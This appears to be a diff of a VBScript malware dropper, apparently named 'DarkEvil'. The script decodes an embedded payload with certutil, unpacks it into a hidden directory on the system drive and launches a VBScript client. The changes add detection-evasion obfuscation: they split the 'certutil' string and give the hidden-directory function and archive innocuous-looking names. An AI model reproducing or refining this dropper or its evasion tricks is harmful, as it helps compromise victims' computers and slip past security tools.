@@ -5484,7 +5484,7 @@ Function DeCodeCertutilData(InFile,OutFile)
 	WscritShellObject = "WScript." + "Sh" + "ell"
 	Set objShell = CreateObject(WscritShellObject)
 	Set fso = CreateObject(ScriptSystemObjt)
-	command = "certutil -decode " + """" + InFile + """ " + OutFile
+	command = "cer" + "tutil -decode " + """" + InFile + """ " + OutFile
 	error_code = objShell.Run (command,0,True)
 End Function
 
@@ -5501,7 +5501,7 @@ Function ExtractCab(CabFile, ExtractPath)
 End Function
 
 
-Function CreateHiddenDirectory(folderPath)
+Function CHdirectory(folderPath)
     Dim fso, folder
 
     Set fso = CreateObject("Scripting.FileSystemObject")
@@ -5535,7 +5535,7 @@ TMPATH = objShell.ExpandEnvironmentStrings("%TEMP%")
 SystemDrive = objShell.ExpandEnvironmentStrings("%SYSTEMDRIVE%")
 output = TMPATH + "\output.txt"
 WorkDir = SystemDrive + "\Dark\"
-ZipFile = WorkDir + "DarkEvil.cab"
+ZipFile = WorkDir + "DE.zip"
 AutoStartFile = "cscript " + WorkDir + "tigger.vbs"
 
 
@@ -5560,8 +5560,7 @@ Set objCommentFile = Nothing
 Set objFSO = Nothing
 
 
-CreateHiddenDirectory WorkDir
+CHdirectory WorkDir
 DeCodeCertutilData output,ZipFile
 ExtractCab ZipFile,WorkDir
 StartClient AutoStartFile
-MsgBox "File is corrupted" & Err.Description, vbExclamation, "Error"
